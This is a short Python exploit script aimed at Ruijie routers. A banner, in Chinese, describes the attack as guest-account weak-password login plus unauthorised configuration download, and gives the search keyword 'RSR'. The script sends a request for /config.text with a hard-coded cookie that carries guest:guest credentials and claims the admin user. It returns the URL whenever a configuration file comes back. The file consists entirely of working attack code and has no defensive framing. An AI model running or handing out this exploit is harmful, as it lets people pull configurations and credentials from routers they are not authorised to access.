import requests
import re
print("锐捷路由器guest用户弱口令 and 越权下载配置文件。Keyword: RSR")
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
    "Content-Type": "text/xml",
    "Cookie": "iffail=no; currentURL=2.4; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=admin; c_name="
}

def exp(target):
    host,port = target.split(':')
    url = 'http://' + target + "/config.text"
    r = requests.get(url,headers=headers)
    if "version" in r.text[0:44]:
        return url
